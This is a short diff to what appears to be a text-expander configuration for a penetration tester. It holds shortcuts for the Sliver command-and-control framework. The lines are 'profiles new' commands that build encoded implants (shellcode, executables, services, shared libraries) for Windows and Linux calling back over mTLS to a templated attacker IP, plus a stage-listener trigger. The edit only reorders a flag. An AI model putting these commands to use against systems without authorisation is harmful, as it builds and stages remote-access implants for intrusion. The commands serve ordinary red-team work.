@@ -97,9 +97,9 @@ matches:
       profiles new -e -a 386 --mtls {{IP}}:443 --format shellcode -o windows shellcode-winx86
       profiles new -e --mtls {{IP}}:443 --format exe -o windows exe-win
       profiles new -e --mtls {{IP}}:443 --format service -o windows service-win
-      profiles new -e --mtls {{IP}}:443 --format shared -o windows shared-win -R
+      profiles new -e --mtls {{IP}}:443 --format shared -o windows -R shared-win 
       profiles new -e --mtls {{IP}}:443 --format exe -o linux  exe-lin
-      profiles new -e --mtls {{IP}}:443 --format shared -o linux shared-lin -R
+      profiles new -e --mtls {{IP}}:443 --format shared -o linux -R shared-lin 
 
   - trigger: ":sliverstage"
     replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile shellcode-
